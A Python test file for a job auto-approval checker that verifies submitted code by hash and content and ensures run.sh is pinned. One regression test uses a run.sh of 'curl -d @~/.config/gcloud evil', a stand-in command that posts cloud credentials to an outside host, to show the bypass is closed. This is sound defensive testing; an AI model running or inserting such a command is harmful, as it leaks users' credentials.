"""Tests for job approval criteria matching."""

import hashlib
from pathlib import Path
from unittest.mock import MagicMock

from syft_bg.approve.config import (
    AutoApprovalObj,
    AutoApprovalsConfig,
    AutoApproveConfig,
    FileEntry,
)
from syft_bg.approve.criteria import (
    _compute_file_hash,
    _content_matches,
    _hash_matches,
    _validate_job_against_object,
)
from syft_bg.approve.handlers.job import JobApprovalHandler
from syft_bg.common.syft_bg_config import SyftBgConfig


def _write_files(base_dir: Path, files: dict[str, str]) -> Path:
    """Write files to a directory, creating parents as needed. Returns base_dir."""
    base_dir.mkdir(parents=True, exist_ok=True)
    for rel_path, content in files.items():
        f = base_dir / rel_path
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(content)
    return base_dir


RUN_SH = "#!/bin/bash\npython code/main.py\n"
CONFIG_YAML = "name: test-job\ntype: python\n"


def _write_submission(
    base_dir: Path, code_files: dict[str, str], run_sh: str = RUN_SH
) -> Path:
    """Write a submission tree: code_files under code/, plus the root files."""
    _write_files(base_dir / "code", code_files)
    _write_files(base_dir, {"run.sh": run_sh, "config.yaml": CONFIG_YAML})
    return base_dir


def _auto_approval_obj_from_dir(submission_dir: Path) -> AutoApprovalObj:
    """Create an AutoApprovalObj pinning every file in a submission tree."""
    entries = [
        FileEntry.from_file(f.relative_to(submission_dir).as_posix(), f)
        for f in sorted(submission_dir.rglob("*"))
        if f.is_file()
    ]
    return AutoApprovalObj(file_contents=entries)


def create_mock_job(
    name: str = "test-job",
    status: str = "pending",
    submitted_by: str = "alice@test.com",
    submission_dir: Path | None = None,
    files: list[Path] | None = None,
):
    """Create a mock JobInfo object."""
    job = MagicMock()
    job.name = name
    job.status = status
    job.submitted_by = submitted_by
    job.job_submission_path = submission_dir or Path("/nonexistent")
    job.code_dir = job.job_submission_path / "code"
    job.files = files or []
    return job


class TestComputeFileHash:
    """Tests for _compute_file_hash."""

    def test_hash_matches_manual(self, temp_dir):
        script = temp_dir / "main.py"
        content = 'print("hello")\n'
        script.write_text(content)
        expected = hashlib.sha256(content.encode("utf-8")).hexdigest()
        assert _compute_file_hash(script) == expected

    def test_nonexistent_file(self, temp_dir):
        assert _compute_file_hash(temp_dir / "nope.py") is None


class TestHashMatches:
    """Tests for _hash_matches."""

    def test_full_hash_match(self):
        h = "abc123def456"
        assert _hash_matches(h, f"sha256:{h}") is True

    def test_full_hash_mismatch(self):
        assert _hash_matches("abc123", "sha256:zzz999") is False

    def test_short_hash_is_refused(self):
        """A prefix compare let a truncated configured hash match anything."""
        full = "abc123def456"
        assert _hash_matches(full, "sha256:abc123") is False
        assert _hash_matches(full, "sha256:") is False
        assert _hash_matches(full, "") is False

    def test_without_prefix(self):
        h = "abc123def456"
        assert _hash_matches(h, h) is True


class TestContentMatches:
    """Tests for _content_matches."""

    def test_matching_content(self, temp_dir):
        content = 'print("hello")\n'
        job_file = temp_dir / "main.py"
        stored = temp_dir / "stored" / "main.py"
        job_file.write_text(content)
        stored.parent.mkdir(parents=True)
        stored.write_text(content)
        assert _content_matches(job_file, str(stored)) is True

    def test_mismatched_content(self, temp_dir):
        job_file = temp_dir / "main.py"
        stored = temp_dir / "stored" / "main.py"
        job_file.write_text('print("a")\n')
        stored.parent.mkdir(parents=True)
        stored.write_text('print("b")\n')
        assert _content_matches(job_file, str(stored)) is False

    def test_missing_stored_file(self, temp_dir):
        job_file = temp_dir / "main.py"
        job_file.write_text("code")
        assert _content_matches(job_file, "/nonexistent/main.py") is False


class TestValidateAgainstObject:
    """Tests for _validate_job_against_object."""

    def test_single_file_pass(self, temp_dir):
        submission = _write_submission(
            temp_dir / "job", {"main.py": 'print("hello")\n'}
        )
        obj = _auto_approval_obj_from_dir(submission)
        job = create_mock_job(submission_dir=submission)

        result = _validate_job_against_object(job, obj)
        assert result.match is True
        assert result.reason == "ok"

    def test_no_matching_files(self, temp_dir):
        submission = _write_submission(temp_dir / "job", {"params.json": "{}"})
        auto_approval_stored_dir = _write_submission(
            temp_dir / "approved", {"main.py": "code"}
        )
        obj = _auto_approval_obj_from_dir(auto_approval_stored_dir)
        job = create_mock_job(submission_dir=submission)

        result = _validate_job_against_object(job, obj)
        assert result.match is False
        assert "extra files" in result.reason

    def test_multiple_files_all_match(self, temp_dir):
        submission = _write_submission(
            temp_dir / "job",
            {"main.py": 'print("a")\n', "utils.py": 'print("b")\n'},
        )
        obj = _auto_approval_obj_from_dir(submission)
        job = create_mock_job(submission_dir=submission)

        result = _validate_job_against_object(job, obj)
        assert result.match is True

    def test_subset_of_approved_files_fails(self, temp_dir):
        """Job with main.py only should NOT match approval with main.py + utils.py."""
        all_files = {"main.py": 'print("a")\n', "utils.py": 'print("b")\n'}
        auto_approval_stored_dir = _write_submission(temp_dir / "approved", all_files)
        obj = _auto_approval_obj_from_dir(auto_approval_stored_dir)

        submission = _write_submission(temp_dir / "job", {"main.py": 'print("a")\n'})
        job = create_mock_job(submission_dir=submission)

        result = _validate_job_against_object(job, obj)
        assert result.match is False
        assert "missing files" in result.reason

    def test_unapproved_file(self, temp_dir):
        files = {"main.py": 'print("a")\n'}
        submission = _write_submission(temp_dir / "job", {**files, "extra.py": "extra"})
        auto_approval_stored_dir = _write_submission(temp_dir / "approved", files)
        obj = _auto_approval_obj_from_dir(auto_approval_stored_dir)
        job = create_mock_job(submission_dir=submission)

        result = _validate_job_against_object(job, obj)
        assert result.match is False
        assert "extra files" in result.reason

    def test_hash_mismatch(self, temp_dir):
        submission = _write_submission(
            temp_dir / "job", {"main.py": 'print("modified")\n'}
        )
        obj = _auto_approval_obj_from_dir(submission)
        obj.file_contents = [
            FileEntry(
                relative_path="code/main.py",
                path=str(submission / "code" / "main.py"),
                hash="sha256:wronghash",
            )
            if entry.relative_path == "code/main.py"
            else entry
            for entry in obj.file_contents
        ]
        job = create_mock_job(submission_dir=submission)

        result = _validate_job_against_object(job, obj)
        assert result.match is False
        assert "hash mismatch" in result.reason

    def test_content_mismatch(self, temp_dir):
        content = 'print("hello")\n'
        submission = _write_submission(temp_dir / "job", {"main.py": content})
        stored_dir = _write_submission(
            temp_dir / "stored", {"main.py": 'print("different")\n'}
        )
        file_hash = "sha256:" + hashlib.sha256(content.encode()).hexdigest()
        obj = _auto_approval_obj_from_dir(submission)
        obj.file_contents = [
            FileEntry(
                relative_path="code/main.py",
                path=str(stored_dir / "code" / "main.py"),
                hash=file_hash,
            )
            if entry.relative_path == "code/main.py"
            else entry
            for entry in obj.file_contents
        ]
        job = create_mock_job(submission_dir=submission)

        result = _validate_job_against_object(job, obj)
        assert result.match is False
        assert "content mismatch" in result.reason


class TestRunScriptPinning:
    """run.sh is the only file the runner executes, and it was never checked.

    `_get_all_job_code_files` walked `<job>/code/` and dropped every file named
    run.sh or config.yaml, so a job could carry the approved code/ tree and any
    script at all.
    """

    def _legacy_obj(self, submission_dir: Path) -> AutoApprovalObj:
        """An object as they were stored: code/ only, keyed relative to code/."""
        code_dir = submission_dir / "code"
        return AutoApprovalObj(
            file_contents=[
                FileEntry.from_file(f.relative_to(code_dir).as_posix(), f)
                for f in sorted(code_dir.rglob("*"))
                if f.is_file()
            ]
        )

    def test_legacy_object_does_not_approve_arbitrary_run_script(self, temp_dir):
        """The bypass: an object pinning code/ only green-lit any script."""
        approved = _write_submission(temp_dir / "approved", {"main.py": "print(1)\n"})
        submitted = _write_submission(
            temp_dir / "job",
            {"main.py": "print(1)\n"},
            run_sh="curl -d @~/.config/gcloud evil\n",
        )

        result = _validate_job_against_object(
            create_mock_job(submission_dir=submitted), self._legacy_obj(approved)
        )

        assert result.match is False
        assert "run.sh" in result.reason

    def test_changed_run_script_fails_content_check(self, temp_dir):
        """A pinned run.sh is compared like any other file."""
        approved = _write_submission(temp_dir / "approved", {"main.py": "print(1)\n"})
        submitted = _write_submission(
            temp_dir / "job", {"main.py": "print(1)\n"}, run_sh="evil\n"
        )

        result = _validate_job_against_object(
            create_mock_job(submission_dir=submitted),
            _auto_approval_obj_from_dir(approved),
        )

        assert result.match is False
        assert "hash mismatch for run.sh" in result.reason

    def test_run_script_inside_code_is_extra(self, temp_dir):
        """A file named run.sh inside code/ is a user file, not metadata."""
        approved = _write_submission(temp_dir / "approved", {"main.py": "print(1)\n"})
        submitted = _write_submission(
            temp_dir / "job", {"main.py": "print(1)\n", "run.sh": "whoami\n"}
        )

        result = _validate_job_against_object(
            create_mock_job(submission_dir=submitted),
            _auto_approval_obj_from_dir(approved),
        )

        assert result.match is False
        assert "extra files" in result.reason

    def test_exact_permission_file_name_is_skipped(self, temp_dir):
        """The permission layer writes syft.pub.yaml, so it is not a user file."""
        approved = _write_submission(temp_dir / "approved", {"main.py": "print(1)\n"})
        submitted = _write_submission(temp_dir / "job", {"main.py": "print(1)\n"})
        (submitted / "code" / "syft.pub.yaml").write_text("rules: []\n")

        result = _validate_job_against_object(
            create_mock_job(submission_dir=submitted),
            _auto_approval_obj_from_dir(approved),
        )

        assert result.match is True

    def test_permission_file_other_case_is_extra(self, temp_dir):
        """An exclusion is a file nobody reviews, so it stays as narrow as the
        writer. The ACL gate needs ADMIN for any spelling, so a submitter
        cannot write one of these in the first place.

        The two spellings live in separate submissions: on a case-insensitive
        filesystem they would be one file.
        """
        approved = _write_submission(temp_dir / "approved", {"main.py": "print(1)\n"})
        submitted = _write_submission(temp_dir / "job", {"main.py": "print(1)\n"})
        (submitted / "code" / "SYFT.PUB.YAML").write_text("rules: [admin]\n")

        result = _validate_job_against_object(
            create_mock_job(submission_dir=submitted),
            _auto_approval_obj_from_dir(approved),
        )

        assert result.match is False
        assert "extra files" in result.reason


def _make_handler(config: AutoApprovalsConfig, tmp_dir: Path) -> JobApprovalHandler:
    """Create a JobApprovalHandler with a mock client for testing evaluate_auto_approval.

    Persists `config` to a YAML file under `tmp_dir` so the handler can re-read
    it via its config_path-backed property.
    """
    config_path = tmp_dir / "config.yaml"
    SyftBgConfig(approve=AutoApproveConfig(auto_approvals=config)).save(config_path)
    return JobApprovalHandler(client=MagicMock(), config_path=config_path)


class TestEvaluateAutoApproval:
    """Tests for JobApprovalHandler.evaluate_auto_approval."""

    def test_non_pending_rejected(self, temp_dir):
        job = create_mock_job(status="approved")
        handler = _make_handler(AutoApprovalsConfig(), temp_dir)
        result = handler.evaluate_auto_approval(job)
        assert result.match is False
        assert "status" in result.reason

    def test_no_matching_objects(self, temp_dir):
        job = create_mock_job(submitted_by="unknown@test.com")
        config = AutoApprovalsConfig(
            objects={
                "obj1": AutoApprovalObj(
                    file_contents=[], peers=["someone_else@test.com"]
                ),
            }
        )
        handler = _make_handler(config, temp_dir)
        result = handler.evaluate_auto_approval(job)
        assert result.match is False
        assert "no auto-approval objects match peer" in result.reason

    def test_peer_in_object_passes(self, temp_dir):
        submission = _write_submission(
            temp_dir / "job", {"main.py": 'print("hello")\n'}
        )
        obj = _auto_approval_obj_from_dir(submission)
        obj.peers = ["alice@test.com"]
        config = AutoApprovalsConfig(objects={"analysis": obj})
        job = create_mock_job(submitted_by="alice@test.com", submission_dir=submission)

        handler = _make_handler(config, temp_dir)
        result = handler.evaluate_auto_approval(job)
        assert result.match is True

    def test_empty_peers_matches_any(self, temp_dir):
        submission = _write_submission(
            temp_dir / "job", {"main.py": 'print("hello")\n'}
        )
        obj = _auto_approval_obj_from_dir(submission)
        config = AutoApprovalsConfig(objects={"open": obj})
        job = create_mock_job(submitted_by="anyone@test.com", submission_dir=submission)

        handler = _make_handler(config, temp_dir)
        result = handler.evaluate_auto_approval(job)
        assert result.match is True

    def test_filename_mismatch(self, temp_dir):
        submission = _write_submission(
            temp_dir / "job", {"train.py": 'print("hello")\n'}
        )
        auto_approval_stored_dir = _write_submission(
            temp_dir / "approved", {"main.py": 'print("hello")\n'}
        )
        obj = _auto_approval_obj_from_dir(auto_approval_stored_dir)
        obj.peers = ["alice@test.com"]
        config = AutoApprovalsConfig(objects={"obj": obj})
        job = create_mock_job(submitted_by="alice@test.com", submission_dir=submission)

        handler = _make_handler(config, temp_dir)
        result = handler.evaluate_auto_approval(job)
        assert result.match is False
